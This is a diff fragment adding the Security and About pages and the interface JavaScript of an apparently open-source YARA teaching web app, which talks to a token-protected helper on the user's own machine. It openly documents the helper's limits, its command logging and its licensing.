+P.sec=()=>`<h1>Security</h1><p class="mu">A website that talks to your terminal deserves hard limits. These are enforced by the agent code, which you can read in <code>agent/yara-hunt-agent.py</code> (about 100 lines).</p>
+<div class="g3"><div class="card"><h5>What the bridge does</h5><ul class="ck"><li>Listens on 127.0.0.1 only, never on your network</li><li>Requires a random one-time token on every request</li><li>Accepts only the exact origin of this site</li><li>Checks the Host header against DNS rebinding</li><li>Reads <code>~/yara-lab</code> and nothing else</li><li>Runs one fixed command: <code>yara -r -s -m rules/rules.yar fileserver</code></li></ul></div>
+<div class="card"><h5>What it never does</h5><ul class="ck x"><li>Run commands sent by the website</li><li>Read or write files outside <code>~/yara-lab</code></li><li>Send data to any server: the page talks to your machine, not the other way round</li><li>Use real malware: lab files are plain text</li><li>Store your commands on this site</li></ul></div>
+<div class="card"><h5>Your checklist</h5><ul class="ck"><li>Press “Copy ‘read it first’ command” and read the script</li><li>Use a throwaway WSL or Kali VM if you prefer</li><li>Run <code>yh_off</code> when finished</li><li>Only use it on machines you own or are allowed to test</li></ul></div></div>
+<div class="card"><h5>How the connection works</h5><div class="kv"><b>Terminal hook</b><span>The connector adds a tiny hook to <em>your current shell only</em> (bash <code>PROMPT_COMMAND</code> or zsh <code>preexec</code>) that appends each command you type <em>while you are inside <code>~/yara-lab</code></em> to <code>~/yara-lab/.feed.log</code>. Command output is not captured.</span><b>File changes</b><span>The agent compares a listing of <code>~/yara-lab/fileserver</code> every 0.4 s and reports created, deleted and modified files.</span><b>Scans</b><span>When you run a yara command against the lab rules, the agent runs the same fixed scan and sends the findings.</span><b>Page side</b><span>This page polls <code>http://127.0.0.1:8765</code> from your browser. Nothing is routed through a third-party server.</span></div></div>
+<div class="card"><h5>In plain words: how it stays safe</h5><p>The helper on your computer lets this page <em>look at</em> one lab folder. It cannot type into your terminal, and this website cannot make it run anything. It answers only your own computer, only this site, and only with a secret code made fresh in your browser tab. This site has no accounts, no database, no cookies and no analytics of its own.</p><p class="mu">Honest note: the hosting provider and Google Fonts see normal web request data, such as your IP address, like any website. Neither sees what happens between your browser and your own terminal.</p></div>
+<div class="cols"><div class="card"><h5>Please don't</h5><ul class="ck x"><li><b>Type passwords, API keys, tokens or other secrets</b> in the connected shell. Commands you type inside <code>~/yara-lab</code> are copied to a log file and shown on this page, where anyone watching your screen can read them.</li><li>Share a screen or screenshot of the Connect page without checking it first. It shows your username and computer name.</li><li>Paste a connect command from any other site or message. Use only the one shown on this site's official address.</li><li>Run it on a work computer, a server or any system you don't own or have permission to test.</li><li>Edit the attack script to cause real damage.</li></ul></div>
+<div class="card"><h5>Honest limits</h5><ul class="ck x"><li>This is a teaching tool, not antivirus. It does not protect your computer.</li><li>YARA only detects and reports. It does not block or delete anything, and a match is a lead, not a verdict.</li><li>No match does not prove a file is safe. Packed or encrypted malware can hide the strings our rules look for.</li><li>Our rules are simple demo rules. Don't use them to judge real files.</li><li>The guided demo is an animation of a simulated attack. The lab files are plain text, not real malware.</li><li>The connector runs a script on your computer. We kept it small and readable, but it has not had a third-party audit. Read it before you run it.</li><li>The helper keeps running until you run <code>yh_off</code> or restart.</li><li>Works best in Chrome, Edge and Firefox. Safari, strict privacy settings and some extensions block the connection.</li><li>Provided as is, with no warranty. See the license on the About page.</li></ul></div></div>
+<div class="card"><h5>If something looks wrong</h5><p>Run <code>yh_off</code>, close this tab, and delete the folders <code>~/yara-lab</code> and <code>~/.yara-hunt</code>. That removes everything the connector created.</p></div>`;
+P.about=()=>`<h1>About & license</h1><p class="mu">YARA Live Hunt is free, open-source educational software.</p>
+<div class="card"><h5>License</h5><p><b>MIT License</b>. Copyright © 2026 SANIA MUSLIAR. You may use, copy, modify, merge, publish, distribute, sublicense and sell copies, provided the copyright notice and permission notice are kept in all copies. The full text is in the <code>LICENSE</code> file in the repository.</p><p><b>The software is provided “as is”, without warranty of any kind</b>, and the authors are not liable for any claim or damages arising from its use.</p></div>
+<div class="card"><h5>Acceptable use</h5><ul class="ck"><li>Learning, teaching, demos, workshops and personal labs</li><li>Running on systems you own or have written permission to test</li></ul><ul class="ck x"><li>Presenting the simulation as a real incident or real malware</li><li>Modifying the attack script to do real damage or to target others</li></ul></div>
+<div class="card"><h5>Third-party notices</h5><ul class="ck"><li><b>YARA</b> is developed by VirusTotal and released under the BSD 3-Clause license. It is installed separately by you, not bundled here.</li><li><b>Inter</b> typeface © The Inter Project Authors, SIL Open Font License 1.1, loaded from Google Fonts.</li><li>Kali Linux is a trademark of OffSec. Linux, Windows and WSL are trademarks of their owners.</li></ul><p class="mu">This project is not affiliated with or endorsed by VirusTotal, Google, OffSec, Microsoft or any other trademark owner named here. This page is not legal advice; replace the name above and review the license for your own use.</p></div>
+<div class="card"><h5>Honest limits</h5><p>The demo is a simulation of a six-stage chain with six real-looking indicators. Four simple rules are not a production detection suite, and a hash list versus YARA is a teaching contrast, not a benchmark.</p></div>`;
+/* ---------- engine ---------- */
+function count(){document.querySelectorAll('[data-count]').forEach(el=>{const to=+el.dataset.count,t0=performance.now(),d=900/S.speed;(function f(t){const k=Math.min(1,(t-t0)/d);el.textContent=Math.round(to*k).toLocaleString('en-IN');if(k<1&&el.isConnected)requestAnimationFrame(f)})(t0)})}
+function post(){document.documentElement.style.setProperty('--k',1/S.speed);document.querySelectorAll('[data-type=text]').forEach(el=>{const w=el.textContent.split(' ');el.textContent='';let i=0;const iv=setInterval(()=>{if(!el.isConnected||i>=w.length)return clearInterval(iv);el.textContent+=(i?' ':'')+w[i++]},70/S.speed)});count();
+const d=$('#dot');if(d){d.style.left=((S.pv??S.st)+.5)/6*100+'%';requestAnimationFrame(()=>requestAnimationFrame(()=>{d.style.left=(S.st+.5)/6*100+'%';S.pv=S.st}))}}
+function R(){$('#m').innerHTML=P[S.p]();document.querySelectorAll('.nv[data-v]').forEach(b=>{b.classList.toggle('on',b.dataset.v==S.p);b.innerHTML=svg(b.dataset.v)+NAV[b.dataset.v]});$('#thb').innerHTML=svg('theme')+(S.th=='dark'?'Light mode':'Dark mode');document.documentElement.dataset.t=S.th;post();if(S.p=='conn')cupd()}
+const stop=()=>{S.play=0;clearTimeout(TMR.t)};
+function tick(){clearTimeout(TMR.t);TMR.t=setTimeout(()=>{if(S.st<5){S.st++;R();tick()}else{S.play=0;R()}},4200/S.speed)}
+function go(i){S.st=Math.max(0,Math.min(5,i));R()}
+function nav(p){stop();clearTimeout(TMR.c);S.p=p;R();scrollTo(0,0);if(p=='conn')poll()}
+const copyT=async t=>{try{await navigator.clipboard.writeText(t)}catch(x){const a=document.createElement('textarea');a.value=t;document.body.appendChild(a);a.select();document.execCommand('copy');a.remove()}};
+document.addEventListener('click',async ev=>{const b=ev.target.closest('[data-a]');if(!b||b.tagName=='SELECT')return;const a=b.dataset.a,v=b.dataset.v;
+if(a=='nav')nav(v);else if(a=='theme'){S.th=S.th=='dark'?'light':'dark';try{localStorage.th=S.th}catch(x){}R()}
+else if(a=='stage'){stop();go(+v)}else if(a=='prev'){stop();go(S.st-1)}else if(a=='next'){stop();go(S.st+1)}
+else if(a=='play'){if(S.play)stop();else{if(S.st==5)S.st=0;S.play=1;tick()}R()}else if(a=='replay'){R()}else if(a=='restart'){stop();go(0)}
+else if(a=='copy'){await copyT(v=='cmd'?cmd():v=='insp'?insp():v=='pre'?PRE:STEPS[+v.slice(1)][2]);const o=b.textContent;b.textContent='Copied ✓';setTimeout(()=>b.textContent=o,1400)}
+else if(a=='stop'){try{await fetch(`http://127.0.0.1:${C.port}/stop`,{method:'POST',headers:{'X-YH-Token':C.tok}})}catch(x){}C.ok=0;C.files=[];C.loaded=0;C.ver=-1;C.ev=[];cupd()}});
+document.addEventListener('change',ev=>{if(ev.target.dataset.a=='speed'){S.speed=+ev.target.value;if(S.play)tick();R()}});
+document.addEventListener('keydown',ev=>{if(S.p!='demo'||/INPUT|SELECT|TEXTAREA/.test(ev.target.tagName))return;if(ev.key=='ArrowRight'){stop();go(S.st+1)}else if(ev.key=='ArrowLeft'){stop();go(S.st-1)}else if(ev.key==' '){ev.preventDefault();$('[data-a=play]').click()}});
+R();hashes().then(()=>{if(S.p=='demo')R()});
+</script>
+</body>
+</html>
